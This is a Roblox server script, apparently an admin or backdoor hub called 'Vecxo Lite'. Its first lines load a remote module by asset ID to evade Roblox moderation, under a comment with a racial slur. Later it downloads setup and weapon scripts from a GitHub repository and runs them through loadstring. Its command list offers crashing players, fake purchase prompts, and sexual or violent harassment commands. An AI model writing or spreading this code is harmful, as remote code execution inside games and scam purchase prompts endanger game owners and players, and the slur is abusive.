--//VECXO LITE STARTS HERE

if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
	require(112691275102014).load() --//MY NEW goog nigga FUCK ROBLOX moderation
end

local cxoURL = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted"
local BackupIDs = {
	-- cxo
	3222470105;
	7306448629;
	21517314;
	35950257;
	-- tech
	1702851506;
	-- knocks
	1551416114;
	-- kozy
	1889958;
	-- decryptionite
	120983992;
	1921860822;
	366631664;
	13425405;
	-- palamode
	523322320;
	-- freddie
	1724769699;
	--vecko
	244903894;
	36373784;
}
function GetWhitelist()
	local returnedUsers = {}
	local success, response = pcall(function()
		return game:GetService("HttpService"):GetAsync(cxoURL)
	end)
	if success and response then
		returnedUsers = string.split(response, "\n")
	else
		print("GitHub check failed! Using backup table.")
		returnedUsers = BackupIDs
	end
	return returnedUsers
end
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local whitelisted = GetWhitelist()
_G.cagedPlayers = _G.cagedPlayers or {}
_G.antiloud = false
exclusivewl = {"Reloxz", "Dekryptionite", "t_echr", "cxotus", "Trogdor973"}
local vecxoconnections = {}
local bannedPlayers = {}
local bannedNameLookup = {}
local chatHistory = {}
local scriptrunning = false
local afk = {}
local gcon = {}
local gmodded = {}
GraphicalEffects = {};
local AutoRespawn = {}
local synapsex = {}
local TweenService = game:GetService("TweenService")
local ServerStorage = game:GetService("ServerStorage")
local countries = {["BD"] = "Bangladesh", ["BE"] = "Belgium", ["BF"] = "Burkina Faso", ["BG"] = "Bulgaria", ["BA"] = "Bosnia and Herzegovina", ["BB"] = "Barbados", ["WF"] = "Wallis and Futuna", ["BL"] = "Saint Barthelemy", ["BM"] = "Bermuda", ["BN"] = "Brunei", ["BO"] = "Bolivia", ["BH"] = "Bahrain", ["BI"] = "Burundi", ["BJ"] = "Benin", ["BT"] = "Bhutan", ["JM"] = "Jamaica", ["BV"] = "Bouvet Island", ["BW"] = "Botswana", ["WS"] = "Samoa", ["BQ"] = "Bonaire, Saint Eustatius and Saba ", ["BR"] = "Brazil", ["BS"] = "Bahamas", ["JE"] = "Jersey", ["BY"] = "Belarus", ["BZ"] = "Belize", ["RU"] = "Russia", ["RW"] = "Rwanda", ["RS"] = "Serbia", ["TL"] = "East Timor", ["RE"] = "Reunion", ["TM"] = "Turkmenistan", ["TJ"] = "Tajikistan", ["RO"] = "Romania", ["TK"] = "Tokelau", ["GW"] = "Guinea-Bissau", ["GU"] = "Guam", ["GT"] = "Guatemala", ["GS"] = "South Georgia and the South Sandwich Islands", ["GR"] = "Greece", ["GQ"] = "Equatorial Guinea", ["GP"] = "Guadeloupe", ["JP"] = "Japan", ["GY"] = "Guyana", ["GG"] = "Guernsey", ["GF"] = "French Guiana", ["GE"] = "Georgia", ["GD"] = "Grenada", ["GB"] = "United Kingdom", ["GA"] = "Gabon", ["SV"] = "El Salvador", ["GN"] = "Guinea", ["GM"] = "Gambia", ["GL"] = "Greenland", ["GI"] = "Gibraltar", ["GH"] = "Ghana", ["OM"] = "Oman", ["TN"] = "Tunisia", ["JO"] = "Jordan", ["HR"] = "Croatia", ["HT"] = "Haiti", ["HU"] = "Hungary", ["HK"] = "Hong Kong", ["HN"] = "Honduras", ["HM"] = "Heard Island and McDonald Islands", ["VE"] = "Venezuela", ["PR"] = "Puerto Rico", ["PS"] = "Palestinian Territory", ["PW"] = "Palau", ["PT"] = "Portugal", ["SJ"] = "Svalbard and Jan Mayen", ["PY"] = "Paraguay", ["IQ"] = "Iraq", ["PA"] = "Panama", ["PF"] = "French Polynesia", ["PG"] = "Papua New Guinea", ["PE"] = "Peru", ["PK"] = "Pakistan", ["PH"] = "Philippines", ["PN"] = "Pitcairn", ["PL"] = "Poland", ["PM"] = "Saint Pierre and Miquelon", ["ZM"] = "Zambia", ["EH"] = "Western Sahara", ["EE"] = "Estonia", ["EG"] = "Egypt", ["ZA"] = "South Africa", ["EC"] = "Ecuador", ["IT"] = "Italy", ["VN"] = "Vietnam", ["SB"] = "Solomon Islands", ["ET"] = "Ethiopia", ["SO"] = "Somalia", ["ZW"] = "Zimbabwe", ["SA"] = "Saudi Arabia", ["ES"] = "Spain", ["ER"] = "Eritrea", ["ME"] = "Montenegro", ["MD"] = "Moldova", ["MG"] = "Madagascar", ["MF"] = "Saint Martin", ["MA"] = "Morocco", ["MC"] = "Monaco", ["UZ"] = "Uzbekistan", ["MM"] = "Myanmar", ["ML"] = "Mali", ["MO"] = "Macao", ["MN"] = "Mongolia", ["MH"] = "Marshall Islands", ["MK"] = "Macedonia", ["MU"] = "Mauritius", ["MT"] = "Malta", ["MW"] = "Malawi", ["MV"] = "Maldives", ["MQ"] = "Martinique", ["MP"] = "Northern Mariana Islands", ["MS"] = "Montserrat", ["MR"] = "Mauritania", ["IM"] = "Isle of Man", ["UG"] = "Uganda", ["TZ"] = "Tanzania", ["MY"] = "Malaysia", ["MX"] = "Mexico", ["IL"] = "Israel", ["FR"] = "France", ["IO"] = "British Indian Ocean Territory", ["SH"] = "Saint Helena", ["FI"] = "Finland", ["FJ"] = "Fiji", ["FK"] = "Falkland Islands", ["FM"] = "Micronesia", ["FO"] = "Faroe Islands", ["NI"] = "Nicaragua", ["NL"] = "Netherlands", ["NO"] = "Norway", ["NA"] = "Namibia", ["VU"] = "Vanuatu", ["NC"] = "New Caledonia", ["NE"] = "Niger", ["NF"] = "Norfolk Island", ["NG"] = "Nigeria", ["NZ"] = "New Zealand", ["NP"] = "Nepal", ["NR"] = "Nauru", ["NU"] = "Niue", ["CK"] = "Cook Islands", ["XK"] = "Kosovo", ["CI"] = "Ivory Coast", ["CH"] = "Switzerland", ["CO"] = "Colombia", ["CN"] = "China", ["CM"] = "Cameroon", ["CL"] = "Chile", ["CC"] = "Cocos Islands", ["CA"] = "Canada", ["CG"] = "Republic of the Congo", ["CF"] = "Central African Republic", ["CD"] = "Democratic Republic of the Congo", ["CZ"] = "Czech Republic", ["CY"] = "Cyprus", ["CX"] = "Christmas Island", ["CR"] = "Costa Rica", ["CW"] = "Curacao", ["CV"] = "Cape Verde", ["CU"] = "Cuba", ["SZ"] = "Swaziland", ["SY"] = "Syria", ["SX"] = "Sint Maarten", ["KG"] = "Kyrgyzstan", ["KE"] = "Kenya", ["SS"] = "South Sudan", ["SR"] = "Suriname", ["KI"] = "Kiribati", ["KH"] = "Cambodia", ["KN"] = "Saint Kitts and Nevis", ["KM"] = "Comoros", ["ST"] = "Sao Tome and Principe", ["SK"] = "Slovakia", ["KR"] = "South Korea", ["SI"] = "Slovenia", ["KP"] = "North Korea", ["KW"] = "Kuwait", ["SN"] = "Senegal", ["SM"] = "San Marino", ["SL"] = "Sierra Leone", ["SC"] = "Seychelles", ["KZ"] = "Kazakhstan", ["KY"] = "Cayman Islands", ["SG"] = "Singapore", ["SE"] = "Sweden", ["SD"] = "Sudan", ["DO"] = "Dominican Republic", ["DM"] = "Dominica", ["DJ"] = "Djibouti", ["DK"] = "Denmark", ["VG"] = "British Virgin Islands", ["DE"] = "Germany", ["YE"] = "Yemen", ["DZ"] = "Algeria", ["US"] = "United States", ["UY"] = "Uruguay", ["YT"] = "Mayotte", ["UM"] = "United States Minor Outlying Islands", ["LB"] = "Lebanon", ["LC"] = "Saint Lucia", ["LA"] = "Laos", ["TV"] = "Tuvalu", ["TW"] = "Taiwan", ["TT"] = "Trinidad and Tobago", ["TR"] = "Turkey", ["LK"] = "Sri Lanka", ["LI"] = "Liechtenstein", ["LV"] = "Latvia", ["TO"] = "Tonga", ["LT"] = "Lithuania", ["LU"] = "Luxembourg", ["LR"] = "Liberia", ["LS"] = "Lesotho", ["TH"] = "Thailand", ["TF"] = "French Southern Territories", ["TG"] = "Togo", ["TD"] = "Chad", ["TC"] = "Turks and Caicos Islands", ["LY"] = "Libya", ["VA"] = "Vatican", ["VC"] = "Saint Vincent and the Grenadines", ["AE"] = "United Arab Emirates", ["AD"] = "Andorra", ["AG"] = "Antigua and Barbuda", ["AF"] = "Afghanistan", ["AI"] = "Anguilla", ["VI"] = "U.S. Virgin Islands", ["IS"] = "Iceland", ["IR"] = "Iran", ["AM"] = "Armenia", ["AL"] = "Albania", ["AO"] = "Angola", ["AQ"] = "Antarctica", ["AS"] = "American Samoa", ["AR"] = "Argentina", ["AU"] = "Australia", ["AT"] = "Austria", ["AW"] = "Aruba", ["IN"] = "India", ["AX"] = "Aland Islands", ["AZ"] = "Azerbaijan", ["IE"] = "Ireland", ["ID"] = "Indonesia", ["UA"] = "Ukraine", ["QA"] = "Qatar", ["MZ"] = "Mozambique"}
local debrisProtectionRunning = false

local function notify(player, title, message)
	coroutine.wrap(function()
		local gui = Instance.new("ScreenGui")
		gui.Name = "AdminNotification"
		gui.ResetOnSpawn = false
		gui.IgnoreGuiInset = true
		gui.Parent = player:FindFirstChildOfClass("PlayerGui")

		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0.4, 0, 0.2, 0)
		frame.Position = UDim2.new(0.5, 0, 0.1, 0)
		frame.AnchorPoint = Vector2.new(0.5, 0)
		frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = gui

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
		titleLabel.Position = UDim2.new(0, 0, 0, 0)
		titleLabel.BackgroundTransparency = 1
		titleLabel.TextTransparency = 1
		titleLabel.TextStrokeTransparency = 1
		titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		titleLabel.Font = Enum.Font.Code
		titleLabel.TextScaled = true
		titleLabel.Text = title
		titleLabel.Parent = frame

		local messageLabel = Instance.new("TextLabel")
		messageLabel.Size = UDim2.new(1, 0, 0.7, 0)
		messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
		messageLabel.BackgroundTransparency = 1
		messageLabel.TextTransparency = 1
		messageLabel.TextStrokeTransparency = 1
		messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
		messageLabel.Font = Enum.Font.Code
		messageLabel.TextScaled = true
		messageLabel.TextWrapped = true
		messageLabel.Text = message
		messageLabel.Parent = frame

		local fadeInTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		TweenService:Create(frame, fadeInTweenInfo, { BackgroundTransparency = 0.2 }):Play()
		TweenService:Create(titleLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
		TweenService:Create(messageLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()

		task.delay(5, function()
			local fadeOutTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
			TweenService:Create(frame, fadeOutTweenInfo, { BackgroundTransparency = 1 }):Play()
			TweenService:Create(titleLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
			TweenService:Create(messageLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
			task.wait(0.5)
			gui:Destroy()
		end)
	end)()
end

local TweenService = game:GetService("TweenService")

function notifyv2(player, title, message)
	task.spawn(function()
		local playerGui = player:WaitForChild("PlayerGui")

		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "VecxoHintGui"
		screenGui.ResetOnSpawn = false
		screenGui.Parent = playerGui

		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0, 300, 0, 80)
		frame.AnchorPoint = Vector2.new(1, 1)
		frame.Position = UDim2.new(1, -20, 1, -20)
		frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		frame.BackgroundTransparency = 0.6
		frame.BorderSizePixel = 0
		frame.Parent = screenGui
		frame.ClipsDescendants = true
		frame.AutomaticSize = Enum.AutomaticSize.Y

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(1, -20, 0, 30)
		titleLabel.Position = UDim2.new(0, 10, 0, 10)
		titleLabel.BackgroundTransparency = 1
		titleLabel.Text = title
		titleLabel.Font = Enum.Font.GothamBold
		titleLabel.TextSize = 20
		titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.Parent = frame

		local messageLabel = Instance.new("TextLabel")
		messageLabel.Size = UDim2.new(1, -20, 0, 40)
		messageLabel.Position = UDim2.new(0, 10, 0, 40)
		messageLabel.BackgroundTransparency = 1
		messageLabel.Text = message
		messageLabel.Font = Enum.Font.Gotham
		messageLabel.TextSize = 16
		messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
		messageLabel.TextWrapped = true
		messageLabel.TextXAlignment = Enum.TextXAlignment.Left
		messageLabel.TextYAlignment = Enum.TextYAlignment.Top
		messageLabel.Parent = frame

		frame.BackgroundTransparency = 1
		titleLabel.TextTransparency = 1
		messageLabel.TextTransparency = 1

		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

		local fadeInTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 0.6})
		local fadeInTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 0})
		local fadeInMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 0})

		fadeInTween:Play()
		fadeInTitleTween:Play()
		fadeInMessageTween:Play()
		task.delay(4, function()
			local fadeOutTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
			local fadeOutTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1})
			local fadeOutMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1})

			fadeOutTween:Play()
			fadeOutTitleTween:Play()
			fadeOutMessageTween:Play()
			task.delay(0.5, function()
				screenGui:Destroy()
			end)
		end)
	end)
end

local assetNameCache = {}

local function getSoundNameFromId(soundId)
	local assetId = tonumber(string.match(soundId, "%d+"))
	if not assetId then return nil end

	if assetNameCache[assetId] then
		return assetNameCache[assetId]
	end

	local success, result = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(assetId)
	end)

	if success and result and result.Name then
		assetNameCache[assetId] = result.Name
		return result.Name
	else
		return nil
	end
end

function GetPlayers(target, me)
	local check4 = false
	local ps = game.Players:GetPlayers()
	local found = {}
	if target == nil then
		check4 = true
		table.insert(found, me)
	end
	if check4 == false and check4 ~= true then
		if target:lower() == "me" then
			found = {me}
		elseif target:lower() == "others" then
			for i, player in ipairs(ps) do
				if player ~= me then
					table.insert(found, player)
				end
			end
		elseif target:lower() == "friends" then
			for i, player in ipairs(ps) do
				if player ~= me and player:IsFriendsWith(me.UserId) then
					table.insert(found, player)
				end
			end
		elseif target:lower() == "all" then
			found = ps
		elseif target:lower() == "random" then
			if #ps > 0 then
				found = {ps[math.random(1, #ps)]}
			end
		else
			for i, player in ipairs(ps) do
				if player.Name:lower():sub(1, #target) == target:lower() or player.DisplayName:lower():sub(1, #target) == target:lower() then
					table.insert(found, player)
				end
			end
		end
	end
	return found
end

local serverprotection = false
local warnings = {}
local playerConnections = {}

local function logChatMessage(plr, msg)
	table.insert(chatHistory, {
		UserId = plr.UserId,
		Name = plr.Name,
		Message = msg
	})
end

local dangerousKeywords = {
	"kill all", "kill others", "punish all", "punish others",
	"fling all", "fling others", "rocket all", "rocket others",
	"kill/all", "kill/others", "rocket/all", "rocket/others", "explode all", "explode others", "explode/all",  "explode/others"
}

local function containsDangerousPhrase(message)
	message = message:lower()
	for _, phrase in ipairs(dangerousKeywords) do
		if string.find(message, phrase, 1, true) then
			return true
		end
	end
	return false
end

local function warnPlayer(player)
	local userId = player.UserId
	local count = warnings[userId] or 0
	count += 1
	warnings[userId] = count

	if count == 1 then
		task.spawn(function()
			GraphicalEffects.CrystalRing(player, "New Yeller", 3)
		end)
		notify(player,"[Vecxo Lite]:", "⚠️ Server protection is on\nYou are on your 1st warning. If you hit three, you will be automatically removed from the server.")
	else
		if count == 2 then
			task.spawn(function()
				GraphicalEffects.CrystalRing(player, "Really red", 3)
			end)
			notify(player,"[Vecxo Lite]:", "⚠️ Server protection is on\nYou are on your 2nd warning. One more strike for abuse, you will be automatically removed from the server.")		
		end
	end
	if count >= 3 then
		task.spawn(function()
			GraphicalEffects.CrystalRing(player, "Really red", 3)
		end)
		local message = Instance.new("Hint", workspace)
		message.Text = "[Vecxo Lite]: ✅ Server protection automatically banned "..player.Name.." for abusing, three strikes were counted."
		player:Kick("[BANNED] by [Vecxo Lite]:  for\nYou have been banned for repeated use of harmful commands.")
		bannedPlayers[player.UserId] = true
		task.spawn(function()
			task.wait(7)
			message:Destroy()
		end)
	end
end

local authTokens = {}

local function pseudoHash(str)
	local hash = 0
	for i = 1, #str do
		hash = (hash * 31 + string.byte(str, i)) % 2^32
	end
	return string.format("%08x", hash)
end

local function generateToken()
	local seedData = tostring(math.random(100000, 999999)) ..
		tostring(os.clock()) ..
		tostring(tick()) ..
		tostring(math.random())
	return pseudoHash(seedData) .. pseudoHash(seedData:reverse())
end

local TokenRemote = game.ReplicatedStorage:FindFirstChild("VecxoCommandToken")
if not TokenRemote then
	TokenRemote = Instance.new("RemoteEvent")
	TokenRemote.Name = "VecxoCommandToken"
	TokenRemote.Parent = game.ReplicatedStorage
end

local RemoteFunction = game.ReplicatedStorage:FindFirstChild("VecxoRequestToken")
if not RemoteFunction then
	RemoteFunction = Instance.new("RemoteFunction")
	RemoteFunction.Name = "VecxoRequestToken"
	RemoteFunction.Parent = game.ReplicatedStorage
end

local function onPlayerChatted(player, message)
	if not serverprotection then return end
	if containsDangerousPhrase(message) then
		warnPlayer(player)
	end
end

local function setupPlayer(player)
	if playerConnections[player.UserId] then
		playerConnections[player.UserId]:Disconnect()
	end
	playerConnections[player.UserId] = player.Chatted:Connect(function(message)
		onPlayerChatted(player, message)
	end)
end

local function cleanupConnections()
	for userId, conn in pairs(playerConnections) do
		if conn then
			conn:Disconnect()
		end
	end
	playerConnections = {}
end

local function refreshPlayer(plr)
	if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		local rnpos = plr.Character.HumanoidRootPart.CFrame

		for _, v in ipairs(plr.Character:GetChildren()) do
			if v:IsA("Accessory") then
				pcall(function()
					v:Destroy()
				end)
			end
		end

		for _, item in ipairs(workspace:GetDescendants()) do
			if (item:IsA("Accessory") or item:IsA("Hat")) and item:FindFirstChild("Handle") and item.Handle:IsDescendantOf(workspace) then
				if item.Name == plr.Name or item.Handle.Name == plr.Name then
					pcall(function()
						item:Destroy()
					end)
				end
			end
		end

		plr:LoadCharacter()
		task.wait()
		if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			plr.Character.HumanoidRootPart.CFrame = rnpos
		end
	else
		plr:LoadCharacter()
	end
end

local TweenService = game:GetService("TweenService")

local imageIds = {
	coolface = "6039299999",
	cry = "13197829717",
	gunface = "966366467",
	popface = "14450880332",
	flushed = "6361629362",
	cracked = "8642281672",
	lolface = "16890042822",
	adore = "9868700627",
	gay = "5192693052",
	crysun = "14225236297",
	chitter = "103341444229833",
	woahface = "18525450668",
	sillycat = "18525375311",
	woahcat = "9276018925",
	maxwell = "11914981726",
	memecat = "4575171283",
	lick = "10670510697",
	devilcat = "8477956665",
	anothacat = "10824339328",
	cat2 = "2058983",
	madkitty = "29347006",
	armykitty = "47771192",
	gamer = "192608797",
	gamerr = "11154422902",
	catmilk = "7220505716",
	omgitsme = "10583059099",
	rahhhhh = "78969294",
	cutecat = "180355555",
	pointnlaugh = "18935448555",
	thunk = "7227513519",
	rizz = "13176191458",
	chad = "14568388433",
	yep = "7970460667",
	angy = "16023922633",
	cmere = "6317749703",
	nerd = "18596283057",
	whyy = "18935703234",
	sobv2 = "10252552852",
	squidwar = "258816537",
	squidmax = "113694969",
}

local function getRandomImageId()
	local keys = {}
	for k in pairs(imageIds) do
		table.insert(keys, k)
	end
	local randKey = keys[math.random(#keys)]
	return imageIds[randKey]
end

function GraphicalEffects.CrystalRing(Player, Color, Duration, RainbowMode)
	RainbowMode = RainbowMode or false
	if not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") then return end

	local crystal_count = 10
	local crystal_color = BrickColor.new(""..Color.."")
	local crystal_scale = Vector3.new(2 / 3, 2, 2 / 3)
	local radius = 1.25 * crystal_count / math.pi
	local spawn_duration = 0.065
	local full_spawn_duration = spawn_duration * crystal_count
	local float_duration = tonumber(Duration)
	local wave_amplitude = 0.5
	local wave_period = 1
	local appear_duration = 0.1
	local disappear_duration = 0.5
	local base_part = Player.Character.HumanoidRootPart
	local offset_cframe = CFrame.new()

	local crystal_template = Instance.new("Part")
	crystal_template.Anchored = true
	crystal_template.Locked = true
	crystal_template.CanCollide = false
	crystal_template.BottomSurface = "Smooth"
	crystal_template.TopSurface = "Smooth"
	crystal_template.Color = crystal_color.Color
	crystal_template.Size = Vector3.new(1, 1, 1)

	local crystal_light = Instance.new("PointLight", crystal_template)
	crystal_light.Brightness = 0.1 / crystal_count
	crystal_light.Color = crystal_color.Color
	crystal_light.Range = radius
	crystal_light.Shadows = true

	local crystal_mesh = Instance.new("SpecialMesh", crystal_template)
	crystal_mesh.MeshId = "rbxassetid://9756362"
	crystal_mesh.MeshType = "FileMesh"
	crystal_mesh.Scale = crystal_scale

	local crystal_model = Instance.new("Model")
	crystal_model.Archivable = false
	crystal_model.Name = "Crystal Model"
	crystal_model.Parent = workspace

	local crystals, lights, meshes = {}, {}, {}
	for index = 1, crystal_count do
		local crystal = crystal_template:Clone()
		crystal.Parent = crystal_model
		crystals[index] = crystal
		lights[index] = crystal:FindFirstChildOfClass("PointLight")
		meshes[index] = crystal:FindFirstChildOfClass("SpecialMesh")
	end

	local start_time = tick()
	repeat
		local base_cframe = base_part and (base_part.CFrame * offset_cframe) or offset_cframe
		local elapsed_time = tick() - start_time

		for index, crystal in ipairs(crystals) do
			local crystal_time = elapsed_time - index * spawn_duration
			local disappear_time = crystal_time - float_duration
			local offset

			if crystal_time < 0 then
				offset = 0
			elseif crystal_time < appear_duration then
				offset = radius * crystal_time / appear_duration
			else
				offset = radius
			end

			if disappear_time >= 0 then
				local disappear_progress = disappear_time / disappear_duration
				if disappear_progress > 1 then
					if crystal.Parent then crystal:Destroy() end
				else
					local inverse_progress = 1 - disappear_progress
					local mesh = meshes[index]
					lights[index].Brightness = 2 * inverse_progress
					lights[index].Range = 2 * radius
					mesh.Scale = crystal_scale * inverse_progress

					if RainbowMode then
						local hue = ((elapsed_time * 0.25) + (index / crystal_count)) % 1
						local col = Color3.fromHSV(hue, 1, 1 - inverse_progress)
						crystal.Color = col
						lights[index].Color = col
					else
						local col = crystal_color.Color:lerp(Color3.new(0, 0, 0), disappear_progress)
						crystal.Color = col
						lights[index].Color = col
					end
				end
			else
				local wave_offset = wave_amplitude * math.sin(math.pi * 2 * (elapsed_time - index / crystal_count * 3) / wave_period)
				if RainbowMode then
					local col = Color3.new(0, 0, 0)
					crystal.Color = col
					lights[index].Color = col
				else
					crystal.Color = crystal_color.Color
					lights[index].Color = crystal_color.Color
				end

				local rotation_angle = (tick() * 0.5 + (index - 1) / crystal_count) % 1 * math.pi * 2
				crystal.CFrame = base_cframe * CFrame.Angles(0, rotation_angle, 0) * CFrame.new(0, wave_offset, -offset)
			end
		end

		game:GetService("RunService").Stepped:Wait()
	until elapsed_time >= float_duration + full_spawn_duration + disappear_duration

	if crystal_model.Parent then
		crystal_model:Destroy()
	end
end

if not game.ReplicatedStorage:FindFirstChild("VecxoCommandEvent") then
	local remote = Instance.new("RemoteEvent")
	remote.Name = "VecxoCommandEvent"
	remote.Parent = game.ReplicatedStorage
	print("VecxoCommandEvent created")
end

if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder") then
	local success, result = pcall(function() -- setup
		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/setup")
	end)

	if success then
		local content = result
		local loaded, fail = loadstring(content)

		if loaded then
			loaded()
		else
			warn("Failed to load setup script: " .. fail)
		end
	else
		warn("Failed to load setup script")
	end

	local success, result = pcall(function() -- gmod gun
		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/gunscript")
	end)

	if success then
		local content = result
		local loaded, fail = loadstring(content)

		if loaded then
			loaded()
		else
			warn("Failed to load gmod gun: " .. fail)
		end
	else
		warn("Failed to load gmod gun.")
	end
end

local function showCommandGui(player)
	if player:FindFirstChild("PlayerGui"):FindFirstChild("VecxoCmds") then
		player.PlayerGui.VecxoCmds:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoCmds"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 400, 0, 300)
	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Commands List"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 26, 0, 26)
	closeBtn.Position = UDim2.new(1, -30, 0, 5)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function()
		gui:Destroy()
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local commands = {
		"--// General Commands \\--",
		"1  - !perm <plr>",
		"2  - !p299 <plr>",
		"3  - !unperm <plr>",
		"4  - !unp299 <plr>",
		"5  - !kick <plr|all|others|random|friends> [reason]",
		"6  - !ban <plr|all|others|random|friends> [reason]",
		"7  - !unban <plr|all|others|random|friends>",
		"8  - !rj <plr|all|others|random|friends>",
		"9  - !wl <plr|all|others|random|friends>",
		"10 - !unwl <plr|all|others|random|friends>",
		"11 - !re <plr|all|others|random|friends>",
		"12 - !hang <plr|all|others|random|friends>",
		"13 - !crucify <plr|all|others|random|friends>",
		"14 - !guil <plr|all|others|random|friends>",
		"15 - !stickbeater <plr|all|others|random|friends>",
		"16 - !knife <plr|all|others|random|friends>",
		"17 - !magician <plr|all|others|random|friends>",
		"18 - !bombvest <plr|all|others|random|friends>",
		"19 - !toolgun <plr|all|others|random|friends>",
		"20 - !gentk <plr|all|others|random|friends>",
		"21 - !provac <plr|all|others|random|friends>",
		"22 - !dex <plr|all|others|random|friends>",
		"23 - !cage <plr|all|others|random|friends>",
		"24 - !grabgun <plr|all|others|random|friends>",
		"25 - !oofgun <plr|all|others|random|friends>",
		"26 - !mute <plr|all|others|random|friends>",
		"27 - !unmute <plr|all|others|random|friends>",
		"28 - !crash <plr|all|others|random|friends>",
		"29 - !jumpscare <plr|all|others|random|friends>",
		"30 - !clyde <plr|all|others|random|friends>",
		"31 - !bclient <plr|all|others|random|friends>",
		"32 - !to <plr|all|others|random|friends>",
		"33 - !bring <plr|all|others|random|friends>",
		"34 - !kidnap <plr|all|others|random|friends>",
		"35 - !chat <plr|all|others|random|friends> [string]",
		"36 - !afk <plr|all|others|random|friends>",
		"37 - !unafk <plr|all|others|random|friends>",
		"38 - !tazer <plr|all|others|random|friends>",
		"39 - !backpack <plr|all|others|random|friends> <true/false>",
		"40 - !sfakereq <plr|all|others|random|friends> <name>",
		"41 - !image <plr|all|others|random|friends> <name> <true/false>",
		"42 - !flashbang <plr|all|others|random|friends>",
		"43 - !antikill <plr|all|others|random|friends>",
		"44 - !unantikill <plr|all|others|random|friends>",
		"45 - !promptpurchase <plr|all|others|random|friends> <itemId> <price> <itemName with spaces>",
		"46 - !f3x <plr|all|others|random|friends>",
		"47 - !findgear <plr|all|others|random|friends> <string/tool name>",
		"48 - !pkick <plr|all|others|random|friends>",
		"49 - !nuke <plr|all|others|random|friends>",
		"",
		"--// Restricted Commands \\--",
		"50 - !jork <plr|all|others|random|friends> [RESTRICTED]",
		"51 - !polaris <plr|all|others|random|friends> [RESTRICTED]",
		"52 - !sens <plr|all|others|random|friends> [RESTRICTED]", 
		"53 - !projhub <plr|all|others|random|friends> [RESTRICTED]",
		"54 - !hwl <plr|all|others|random|friends> [RESTRICTED]",
		"55 - !unhwl <plr|all|others|random|friends> [RESTRICTED]",
		"56 - !woman <plr|all|others|random|friends> [RESTRICTED]",
		"57 - !bang <plr1> [optional] <plr2> [RESTRICTED]",
		"58 - !buildload <plr> <slot> [RESTRICTED]",
		"59 - !buildremove <plr> <slot> [RESTRICTED]",
		"60 - !exser <plr|all|others|random|friends> [RESTRICTED]",
		"",
		"--// Utility Commands \\--",
